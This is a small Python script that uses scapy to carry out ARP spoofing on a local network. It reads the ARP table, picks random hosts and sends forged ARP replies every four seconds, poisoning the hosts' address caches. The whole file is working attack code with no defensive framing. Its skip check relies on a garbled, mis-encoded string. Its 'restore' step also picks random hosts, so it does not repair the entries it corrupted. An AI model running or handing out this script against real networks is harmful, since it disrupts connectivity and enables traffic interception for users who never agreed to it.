import scapy.all as scapy
import random
import os
import time

interval = 4

def arp_random():
    os.system('arp -a > .detector')
    ip_list = []
    with open(".detector", "r") as f:
        for line in f.readlines()[3:]:
            if line.split()[3] == "вЁзҐбЄЁ©":
                continue
            ip_addr = line.split()[0]
            if ip_addr not in ip_list:
                ip_list.append(ip_addr)
    os.remove(".detector")
    return ip_list[random.randint(0, len(ip_list) - 1)]

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

try:
    while True:
        spoof(arp_random(), arp_random())
        time.sleep(interval)
except KeyboardInterrupt:
    restore(arp_random(), arp_random())